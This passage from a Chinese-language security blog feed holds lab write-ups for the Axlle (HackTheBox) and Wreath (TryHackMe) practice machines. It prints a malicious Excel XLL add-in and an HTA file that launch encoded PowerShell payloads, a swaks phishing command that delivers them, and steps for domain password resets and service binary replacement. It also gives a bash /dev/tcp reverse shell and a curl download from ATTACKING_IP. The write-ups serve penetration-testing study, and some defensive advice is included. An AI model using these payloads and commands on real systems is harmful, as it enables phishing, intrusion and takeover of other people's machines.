(445&#x2F;TCP)<ul><li>消息签名已启用且必需</li><li>Windows Server SMB 服务</li></ul></li></ul><h4 id="RPC-服务-135-TCP"><a href="#RPC-服务-135-TCP" class="headerlink" title="RPC 服务 (135&#x2F;TCP)"></a>RPC 服务 (135&#x2F;TCP)</h4><ul><li>Microsoft Windows RPC</li></ul><hr><h2 id="🧠-渗透思路"><a href="#🧠-渗透思路" class="headerlink" title="🧠 渗透思路"></a>🧠 渗透思路</h2><h3 id="攻击面分析"><a href="#攻击面分析" class="headerlink" title="攻击面分析"></a>攻击面分析</h3><ol><li><p><strong>邮件系统</strong></p><ul><li>hMailServer 可能存在配置问题</li><li>可尝试邮件钓鱼攻击</li></ul></li><li><p><strong>域环境</strong></p><ul><li>完整的 AD 域环境</li><li>可能存在域用户枚举机会</li><li>Kerberos 认证可能存在配置问题</li></ul></li><li><p><strong>Web 应用</strong></p><ul><li>IIS 10.0 可能存在漏洞</li><li>需进行详细的 Web 应用测试</li></ul></li></ol><h2 id="🌐-初始访问"><a href="#🌐-初始访问" class="headerlink" title="🌐 初始访问"></a>🌐 初始访问</h2><h3 id="1-Web-应用信息收集"><a href="#1-Web-应用信息收集" class="headerlink" title="1. Web 应用信息收集"></a>1. Web 应用信息收集</h3><p>从网站上发现重要信息：</p><blockquote><p>如果您有任何未付的发票或请求，请以Excel格式将其通过电子邮件发送至 <a href="mailto:&#x61;&#x63;&#x63;&#111;&#117;&#110;&#116;&#x73;&#x40;&#x61;&#120;&#108;&#108;&#101;&#x2e;&#104;&#x74;&#x62;">&#x61;&#x63;&#x63;&#111;&#117;&#110;&#116;&#x73;&#x40;&#x61;&#120;&#108;&#108;&#101;&#x2e;&#104;&#x74;&#x62;</a>。请注意，由于安全状况，所有宏都被禁用。</p></blockquote><h3 id="2-XLL-文件攻击"><a href="#2-XLL-文件攻击" class="headerlink" title="2. XLL 文件攻击"></a>2. XLL 文件攻击</h3><p>由于目标禁用了宏，我们可以使用 XLL (Excel Add-In) 进行攻击。XLL 是专为 Excel 设计的动态链接库，可以扩展 Excel 功能。</p><ol><li>创建恶意 XLL 文件：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">__declspec(dllexport) <span class="type">void</span> __cdecl <span class="title function_">xlAutoOpen</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">xlAutoOpen</span><span class="params">()</span> &#123;</span><br><span class="line">    WinExec(<span class="string">&quot;powershell -e &lt;base64_encoded_payload&gt;&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule,</span></span><br><span class="line"><span class="params">    DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">    LPVOID lpReserved</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>编译 XLL 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll exp.c -luser32 </span><br></pre></td></tr></table></figure></li><li><p>发送钓鱼邮件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">swaks --to accounts@axlle.htb \</span><br><span class="line">      --from root@test.htb \</span><br><span class="line">      --body <span class="string">&quot;Shell&quot;</span> \</span><br><span class="line">      --header <span class="string">&quot;Subject: Help me Breach the System&quot;</span> \</span><br><span class="line">      --attach @shell.xll</span><br></pre></td></tr></table></figure></li></ol><p><a href="/assets/img/Pasted%20image%2020241122160927.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122160927.png"></a><br><a href="/assets/img/Pasted%20image%2020241122161132.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122161132.png"></a></p><h3 id="3-HTA-文件攻击"><a href="#3-HTA-文件攻击" class="headerlink" title="3. HTA 文件攻击"></a>3. HTA 文件攻击</h3><p>我们可以使用 HTA 文件攻击来获取 shell。HTA 文件是 HTML 应用程序，可以包含恶意代码。</p><ol><li>创建恶意 HTA 文件：</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span> <span class="attr">ID</span>=<span class="string">&quot;shell&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> c = <span class="string">&quot;powershell -e &lt;base64_encoded_payload&gt;&quot;</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;WScript.Shell&#x27;</span>).<span class="title class_">Run</span>(c, <span class="number">0</span>, <span class="literal">true</span>); </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>self.close();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>发送 HTA 文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver -smb2support share .</span><br></pre></td></tr></table></figure></li></ol><p><a href="/assets/img/Pasted%20image%2020241122171329.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122171329.png"></a></p><p>成功获取反弹 shell：<br><a href="/assets/img/Pasted%20image%2020241122171438.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122171438.png"></a></p><h2 id="🔨-权限提升"><a href="#🔨-权限提升" class="headerlink" title="🔨 权限提升"></a>🔨 权限提升</h2><h3 id="1-域内信息收集"><a href="#1-域内信息收集" class="headerlink" title="1. 域内信息收集"></a>1. 域内信息收集</h3><p>使用 BloodHound 进行域内信息收集：</p><p><a href="/assets/img/Pasted%20image%2020241122171929.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122171929.png"></a><br><a href="/assets/img/Pasted%20image%2020241122172116.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122172116.png"></a></p><ol><li><p>上传 BloodHound：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver share $(<span class="built_in">pwd</span>) -smb2support</span><br></pre></td></tr></table></figure></li><li><p>在目标机器上执行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\bloodhound.exe <span class="literal">-c</span> all</span><br></pre></td></tr></table></figure></li></ol><p><a href="/assets/img/Pasted%20image%2020241122172544.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122172544.png"></a></p><p><a href="/assets/img/Pasted%20image%2020241122173441.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122173441.png"></a></p><p><a href="/assets/img/Pasted%20image%2020241122173452.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122173452.png"></a></p><h3 id="2-权限提升路径分析"><a href="#2-权限提升路径分析" class="headerlink" title="2. 权限提升路径分析"></a>2. 权限提升路径分析</h3><p>通过 BloodHound 分析发现：</p><ul><li>组 <code>WEB DEVS@AXLLE.HTB</code> 的成员可以修改用户 <code>JACOB.GREENY@AXLLE.HTB</code> 的密码</li><li>不需要知道该用户的当前密码</li></ul><h3 id="3-利用-PowerView-修改密码"><a href="#3-利用-PowerView-修改密码" class="headerlink" title="3. 利用 PowerView 修改密码"></a>3. 利用 PowerView 修改密码</h3><ol><li><p>上传 PowerView：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> \\<span class="number">10.10</span>.<span class="number">16.27</span>\share\PowerView.ps1 .</span><br></pre></td></tr></table></figure></li><li><p>修改用户密码：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> <span class="string">&#x27;JACOB.GREENY&#x27;</span> <span class="literal">-AccountPassword</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="literal">-AsPlainText</span> <span class="string">&#x27;NewPassword123!&#x27;</span> <span class="literal">-Force</span>)</span><br></pre></td></tr></table></figure></li></ol><p><a href="/assets/img/Pasted%20image%2020241122175636.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122175636.png"></a></p><ol start="3"><li>使用新密码通过 WinRM 连接：</li></ol><p><a href="/assets/img/Pasted%20image%2020241122174558.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122174558.png"></a><br><a href="/assets/img/Pasted%20image%2020241122175654.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122175654.png"></a></p><h3 id="4-系统权限提升"><a href="#4-系统权限提升" class="headerlink" title="4. 系统权限提升"></a>4. 系统权限提升</h3><ol><li>发现自动化程序：<br>在 App Development 文件夹中发现 README.md 文件：<br><a href="/assets/img/Pasted%20image%2020241122180500.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122180500.png"></a></li></ol><p>README.md 文件显示 standalonerunner.exe 文件正在作为自动化的 SYSTEM 运行：<br><a href="/assets/img/Pasted%20image%2020241122180512.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122180512.png"></a></p><ol start="2"><li><p>检查文件权限：<br><a href="/assets/img/Pasted%20image%2020241122180428.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122180428.png"></a></p></li><li><p>替换恶意程序：<br>创建反弹 shell 的可执行文件并替换原文件<br><a href="/assets/img/Pasted%20image%2020241122182139.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122182139.png"></a></p></li><li><p>等待自动化运行，获取 SYSTEM 权限：<br><a href="/assets/img/Pasted%20image%2020241122182036.png" class="gallery-item"><img src="/assets/img/Pasted%20image%2020241122182036.png"></a></p></li></ol><h2 id="📚-知识点回顾"><a href="#📚-知识点回顾" class="headerlink" title="📚 知识点回顾"></a>📚 知识点回顾</h2><h3 id="1-信息收集技巧"><a href="#1-信息收集技巧" class="headerlink" title="1. 信息收集技巧"></a>1. 信息收集技巧</h3><ul><li><strong>端口扫描</strong><ul><li>使用 <code>naabu</code> 快速扫描</li><li>使用 <code>nmap</code> 进行详细版本探测</li></ul></li><li><strong>服务枚举</strong><ul><li>SMTP 服务配置分析</li><li>Active Directory 域环境识别</li><li>Web 服务版本识别</li></ul></li></ul><h3 id="2-攻击技术"><a href="#2-攻击技术" class="headerlink" title="2. 攻击技术"></a>2. 攻击技术</h3><ul><li><strong>邮件钓鱼</strong><ul><li>XLL 文件攻击绕过宏限制</li><li>HTA 文件执行技巧</li></ul></li><li><strong>域内渗透</strong><ul><li>BloodHound 域内信息收集</li><li>PowerView 密码修改</li><li>自动化任务劫持</li></ul></li></ul><h3 id="3-权限提升技巧"><a href="#3-权限提升技巧" class="headerlink" title="3. 权限提升技巧"></a>3. 权限提升技巧</h3><ul><li><strong>横向移动</strong><ul><li>利用域用户权限</li><li>WinRM 远程连接</li></ul></li><li><strong>纵向提升</strong><ul><li>文件权限分析</li><li>系统服务替换</li><li>自动化任务利用</li></ul></li></ul><h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><h3 id="攻击链回顾"><a href="#攻击链回顾" class="headerlink" title="攻击链回顾"></a>攻击链回顾</h3><ol><li>通过邮件系统投递 XLL 文件获取初始访问</li><li>利用 HTA 文件获取更稳定的 shell</li><li>使用 BloodHound 发现域内提权路径</li><li>通过 PowerView 修改域用户密码</li><li>利用自动化任务获取系统权限</li></ol><h3 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h3><ol><li><strong>邮件安全</strong><ul><li>严格限制附件类型</li><li>实施邮件安全网关</li></ul></li><li><strong>域环境加固</strong><ul><li>严格控制域用户权限</li><li>定期审计域内权限</li></ul></li><li><strong>系统加固</strong><ul><li>限制自动化任务权限</li><li>加强文件系统权限控制</li></ul></li></ol><h3 id="工具总结"><a href="#工具总结" class="headerlink" title="工具总结"></a>工具总结</h3><ul><li><strong>信息收集</strong>：naabu、nmap</li><li><strong>域内渗透</strong>：BloodHound、PowerView</li><li><strong>权限提升</strong>：WinPEAS</li><li><strong>远程连接</strong>：Evil-WinRM</li></ul></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THB </tag>
            
            <tag> #域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THB-Axlle</title>
      <link href="/2024/11/22/Axlle-back/"/>
      <url>/2024/11/22/Axlle-back/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="66296b9d08a03a18667233093149555bb75f8c58674d06515743505169d27637"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THB </tag>
            
            <tag> #域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-wreath</title>
      <link href="/2024/11/21/wreath/"/>
      <url>/2024/11/21/wreath/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>一句话总结：</p></blockquote><h1 id="🚀-靶场概述"><a href="#🚀-靶场概述" class="headerlink" title="🚀 靶场概述"></a>🚀 靶场概述</h1><p><strong>难度</strong>：<br><strong>描述</strong>：  了解如何通过入侵面向公众的 Web 计算机并通过隧道传输您的流量以访问 Wreath 网络中的其他计算机来通过网络进行转换</p><p><a href="/../assets/img/Pasted%20image%2020241121145312.png" title="拓扑图" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121145312.png" alt="拓扑图"></a><br><a href="/../assets/img/Pasted%20image%2020241121145417.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121145417.png"></a></p><hr><h2 id="📋-基本信息"><a href="#📋-基本信息" class="headerlink" title="📋 基本信息"></a>📋 基本信息</h2><table><thead><tr><th>🚀</th><th><strong>本地机器信息</strong></th><th><strong>目标机器信息</strong></th><th></th></tr></thead><tbody><tr><td><strong>IP</strong></td><td>10.50.86.16</td><td>10.200.85.200</td><td></td></tr><tr><td><strong>OS</strong></td><td><code>Kali</code></td><td></td><td></td></tr></tbody></table><hr><h2 id="🔍-信息搜集"><a href="#🔍-信息搜集" class="headerlink" title="🔍 信息搜集"></a>🔍 信息搜集</h2><h3 id="1-🛠️-端口扫描"><a href="#1-🛠️-端口扫描" class="headerlink" title="1. 🛠️ 端口扫描"></a>1. 🛠️ 端口扫描</h3><ul><li><p>使用工具如 <code>nmap</code> 或 <code>masscan</code> 进行端口扫描，发现目标机器开放的端口。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">naabu -host 10.200.85.200</span><br><span class="line">22/tcp    open  ssh      OpenSSH 8.0 (protocol 2.0)</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.37 ((centos) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>c)</span><br><span class="line"><span class="number">443</span>/tcp   open  ssl/http Apache httpd <span class="number">2.4</span>.<span class="number">37</span> ((centos) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>c)</span><br><span class="line"><span class="number">10000</span>/tcp open  http     MiniServ <span class="number">1.890</span> (Webmin httpd)</span><br><span class="line"></span><br><span class="line">Aggressive OS guesses: Linux <span class="number">3.10</span> - <span class="number">3.13</span> (<span class="number">90</span>%)</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-🔎-路径探测"><a href="#2-🔎-路径探测" class="headerlink" title="2. 🔎 路径探测"></a>2. 🔎 路径探测</h3><ul><li>扫描网站或系统的开放路径，寻找潜在的漏洞。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">gobuster <span class="built_in">dir</span> -u http://10.17.5.121 -w /usr/share/wordlists/dirb/common.txt</span><br><span class="line">dirb http://10.17.5.121</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-🧰-服务枚举"><a href="#3-🧰-服务枚举" class="headerlink" title="3. 🧰 服务枚举"></a>3. 🧰 服务枚举</h3><ul><li>对服务进行详细的枚举，寻找潜在漏洞。<ul><li>使用工具如 <code>nmap</code>、<code>nikto</code>、<code>dirbuster</code> 等。</li></ul></li></ul><hr><h2 id="🧠-渗透思路"><a href="#🧠-渗透思路" class="headerlink" title="🧠 渗透思路"></a>🧠 渗透思路</h2><h3 id="1-⚡-攻击向量"><a href="#1-⚡-攻击向量" class="headerlink" title="1. ⚡ 攻击向量"></a>1. ⚡ 攻击向量</h3><ul><li>根据目标机器暴露的服务和漏洞，选择攻击路径。<br>  <a href="/../assets/img/Pasted%20image%2020241121151503.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121151503.png"></a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10000/tcp open  http     MiniServ 1.890 (Webmin httpd) </span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241121152025.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121152025.png"></a></p><h3 id="2-💥-nday-利用"><a href="#2-💥-nday-利用" class="headerlink" title="2. 💥 nday 利用"></a>2. 💥 nday 利用</h3><ul><li>查找未打补丁的漏洞，利用公开的 <strong>nday</strong> 漏洞。<br>  -<a href="/../assets/img/Pasted%20image%2020241121152808.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121152808.png"></a></li></ul><h3 id="3-🔍-信息审计"><a href="#3-🔍-信息审计" class="headerlink" title="3. 🔍 信息审计"></a>3. 🔍 信息审计</h3><ul><li>审计目标系统，查找敏感信息或配置错误。<ul><li>通过配置文件、日志文件等进行信息审计。<br><a href="/../assets/img/Pasted%20image%2020241121153104.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121153104.png"></a></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1</span><br></pre></td></tr></table></figure><hr><h2 id="🌐-Web-渗透测试"><a href="#🌐-Web-渗透测试" class="headerlink" title="🌐 Web 渗透测试"></a>🌐 Web 渗透测试</h2><ul><li><strong>Web 漏洞扫描</strong>：使用 Burp Suite、Nikto 等工具进行 Web 应用的扫描。</li><li><strong>漏洞利用</strong>：利用常见漏洞，如 SQL 注入、XSS 等，进行进一步测试。</li></ul><hr><h2 id="🔐-横向移动与后渗透操作"><a href="#🔐-横向移动与后渗透操作" class="headerlink" title="🔐 横向移动与后渗透操作"></a>🔐 横向移动与后渗透操作</h2><ul><li><strong>横向移动</strong>：一旦获取基础 shell，搜索网络内其他潜在目标，进行横向渗透。</li><li><strong>后渗透操作</strong>：<ol><li>获取敏感信息（如数据库、用户凭证）。</li><li>持久化访问，通过反向 shell、计划任务等手段保持连接。</li></ol></li></ul><hr><h2 id="🕵️‍♂️-漏洞利用"><a href="#🕵️‍♂️-漏洞利用" class="headerlink" title="🕵️‍♂️ 漏洞利用"></a>🕵️‍♂️ 漏洞利用</h2><h3 id="漏洞名称："><a href="#漏洞名称：" class="headerlink" title="漏洞名称：&lt;漏洞名称&gt;"></a>漏洞名称：&lt;漏洞名称&gt;</h3><ul><li><strong>描述</strong>：&lt;漏洞描述&gt;</li><li><strong>利用过程</strong>：<ol><li><strong>漏洞分析</strong>：&lt;简要描述漏洞的成因&gt;</li><li><strong>编写利用脚本</strong> 或 <strong>使用现有工具</strong>：&lt;如何利用&gt;</li><li><strong>验证漏洞是否有效</strong>：&lt;验证步骤&gt;</li><li><strong>获取相关权限或信息</strong>：&lt;攻击目标后获取的权限&gt;</li></ol></li></ul><hr><h2 id="💻-getshell"><a href="#💻-getshell" class="headerlink" title="💻 getshell"></a>💻 getshell</h2><ul><li><strong>描述</strong>：通过漏洞获取目标机器的 shell（命令行访问）。</li><li><strong>步骤</strong>：<ol><li>使用反向 shell 获取访问权限 进一步稳定的shell： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.17.5.121/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><strong>验证 shell 是否成功</strong>： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure></li><li>获取id_rsa<br>  <a href="/../assets/img/Pasted%20image%2020241121154958.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121154958.png"></a></li></ol></li></ul><hr><h2 id="🔨-提权"><a href="#🔨-提权" class="headerlink" title="🔨 提权"></a>🔨 提权</h2><ul><li><strong>描述</strong>：在目标系统中进行权限提升，获取 root 权限。</li><li><strong>步骤</strong>：<ol><li>查看当前用户和权限： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure></li><li>查找本地提权漏洞或配置错误：<ul><li>使用 <code>linpeas</code>、<code>GTFOBins</code> 查找提权方法。</li></ul></li><li>提升权限至 root 用户： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /bin/bash  <span class="comment"># 提升为 root</span></span><br></pre></td></tr></table></figure></li></ol></li></ul><hr><h2 id="隧道代理和端口转发"><a href="#隧道代理和端口转发" class="headerlink" title="隧道代理和端口转发"></a>隧道代理和端口转发</h2><p>我们用于透视的方法往往因不同的目标操作系统而异。像 Metasploit 这样的框架可以简化这个过程，但是，目前，我们将寻找更多的手动技术来进行透视。</p><p>渗透测试的这一领域包含两种主要方法：</p><ul><li><p><strong>隧道&#x2F;代理：</strong> 通过受感染的计算机创建代理类型的连接，以便将所有所需的流量路由到目标网络。这也可能在另一个协议（例如 SSH 隧道）内_进行隧道_传输，这对于规避基本 <strong>I</strong>ntrusion <strong>D</strong>etection <strong>S</strong>ystem （IDS） 或防火墙非常有用  </p></li><li><p><strong>端口转发：</strong>通过受损主机在本地端口和目标上的单个端口之间创建连接</p></li></ul><p>如果我们想将大量不同类型的流量重定向到我们的目标网络 – 例如，使用 nmap 扫描，或者访问多台不同机器上的多个端口，那么代理是很好的。</p><p>端口转发往往更快、更可靠，但只允许我们访问目标设备上的单个端口（或小范围）。</p><p>哪种 pivoting 样式更合适完全取决于网络的布局，因此在决定如何进行之前，我们必须从进一步的枚举开始。此时，明智的做法是开始绘制您所看到的网络布局 —— 尽管在这个练习网络的情况下，布局在屏幕顶部的框中给出。</p><p>作为一般规则，如果您有多个可能的入口点，请尽可能使用 Linux&#x2F;Unix 目标，因为这些目标往往更容易从中转。面向外部的 Linux Web 服务器绝对是理想的选择。  </p><p>本节中的其余任务将涵盖以下主题：</p><ul><li>使用本机和静态编译工具枚举网络</li><li>代理链 &#x2F; FoxyProxy</li><li>SSH 端口转发和隧道（主要是 Unix）</li><li>plink.exe （Windows）</li><li>socat（Windows 和 Unix）  </li><li>凿子 （Windows 和 Unix）</li><li>sshuttle （目前仅限 Unix）</li></ul><p>ocat 不仅非常适合完全稳定的 Linux shell<a href="https://tryhackme.com/room/introtoshells">[1]</a>，也非常适合端口转发。socat 的一大缺点（除了经常出现的问题 人们已经学习了语法），因为它很少由 default 在目标上。也就是说，静态二进制文件很容易找到 <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">Linux</a> 和 <a href="https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download">Windows</a> 都可用。 请记住，Windows 版本不太可能绕过防病毒软件 software 默认，因此可能需要自定义编译。在我们开始之前，值得注意的是：如果您已经完成了 <a href="https://tryhackme.com/room/introtoshells">What the Shell？</a>房间，您将知道 Socat 可用于创建加密连接。此处显示的技术可以与 shells room 中详述的加密选项相结合，以创建加密的端口转发和中继。为避免使本节过于复杂，这里不会教授这种技术;但是，在您自己的时间进行实验是非常值得的。  </p><p>虽然以下技术不能用于将完整代理设置到目标网络中，但很有可能使用它们成功地转发来自 Linux 和 Windows 受损目标的端口。特别是，socat 是一个非常好的中继：例如，如果您试图在与攻击计算机没有直接连接的目标上获取 shell，则可以使用 socat 在当前受感染的机器上设置中继。这将监听来自目标的反向 shell，然后立即将其转发回攻击框：</p><p><a href="https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png" title="Diagram demonstrating the purpose of a relay to forward a shell back from a target PC" class="gallery-item"><img src="https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png" alt="Diagram demonstrating the purpose of a relay to forward a shell back from a target PC"></a>  </p><p>最好将 socat 视为将两件事连接在一起的一种方式——有点像 Portal 游戏中的 Portal Gun，它在两个不同的位置之间建立了联系。这可以是同一台机器上的两个端口，可能是在两台不同的机器之间创建一个中继，可能是在端口和监听机器上的文件之间创建一个连接，或者许多其他类似的事情。这是一个非常强大的工具，非常值得您在自己的时间里研究。</p><p>然而，一般来说，黑客倾向于使用它来创建反向&#x2F;绑定 shell，或者如上例所示，创建一个端口转发。具体来说，在上面的示例中，我们将创建一个_从_受感染服务器上的端口转发_到_我们自己机器上的侦听端口的端口。不过，我们可以用另一种方式来实现，通过将连接从攻击机器转发到网络内部的目标，或者在_攻击机器_上的侦听端口与内部服务器上的服务之间创建直接链接。后一个应用程序特别有用，因为它不需要在受感染的服务器上打开端口。</p><p>在使用 socat 之前，通常需要为它下载一个二进制文件，然后将其上传到盒子中。</p><p><strong>例如，使用 Python Web 服务器：-</strong></p><p>在 Kali 上（在包含 Socat 二进制文件的目录内）：</p><p><code>sudo python3 -m http.server 80</code></p><p>然后，在目标上：<br><code>curl ATTACKING_IP/socat -o /tmp/socat-USERNAME &amp;&amp; chmod +x /tmp/socat-USERNAME</code></p><p><a 